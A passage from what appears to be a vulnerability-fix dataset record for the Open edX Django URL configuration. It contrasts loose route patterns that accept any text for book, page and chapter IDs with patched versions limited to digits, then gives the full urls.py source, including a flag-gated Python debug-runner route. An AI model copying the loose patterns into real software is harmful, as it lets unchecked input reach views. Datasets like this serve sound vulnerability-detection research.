url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',", "            'staticbook.views.pdf_index'),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',", "            'staticbook.views.pdf_index'),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',", "            'staticbook.views.pdf_index'),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',", "            'staticbook.views.html_index'),"], "goodparts": ["        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',", "            'staticbook.views.pdf_index', name=\"pdf_book\"),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',", "            'staticbook.views.pdf_index', name=\"pdf_book\"),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',", "            'staticbook.views.pdf_index', name=\"pdf_book\"),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',", "            'staticbook.views.html_index', name=\"html_book\"),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',"]}], "source": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500' ", "sourceWithComments": "from django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n        